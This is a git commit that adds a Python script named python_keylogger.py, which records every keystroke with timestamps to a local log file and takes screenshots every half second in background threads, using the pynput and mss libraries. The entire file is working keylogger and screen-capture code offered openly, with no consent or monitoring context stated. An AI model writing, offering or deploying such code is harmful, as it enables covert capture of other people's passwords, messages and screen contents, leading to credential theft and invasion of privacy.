9a88507c8b2a3ef3425f7c85f5599d2cd0913c23
PratikMunot <47396315+PratikMunot@users.noreply.github.com>
2020-03-26 13:17:24 +0530

    Create python_keylogger.py

---
+++ KeyLogger/python_keylogger.py
@@ -0,0 +1,48 @@
+import time
+import os
+from threading import Timer, Thread
+from mss import mss
+from pynput.keyboard import Listener
+import subprocess
+
+
+class IntervalTimer(Timer):
+    def run(self):
+        while not self.finished.wait(self.interval):
+            self.function(*self.args, **self.kwargs)
+
+
+class Monitor:
+
+    def _on_press(self, k):
+        with open('./logs/keylogs/log.txt', 'a') as f:
+            f.write('{}\t\t{}\n'.format(k, time.time()))
+
+    def _build_logs(self):
+        if not os.path.exists('./logs'):
+            os.mkdir('./logs')
+            os.mkdir('./logs/screenshots')
+            os.mkdir('./logs/keylogs')
+
+    def _keylogger(self):
+        with Listener(on_press=self._on_press) as listener:
+            listener.join()
+
+    def _screenshot(self):
+        sct = mss()
+        sct.shot(output='./logs/screenshots/{}.jpg'.format(time.time()))
+
+    def run(self, interval=0.5):
+        """
+        Launch the keylogger and screenshot taker in two separate threads.
+        Interval is the amount of time in seconds that occurs between screenshots.
+        """
+        self._build_logs()
+        Thread(target=self._keylogger).start()
+        IntervalTimer(interval, self._screenshot).start()
+
+if __name__ == '__main__':
+    mon = Monitor()
+    mon.run()
+
+
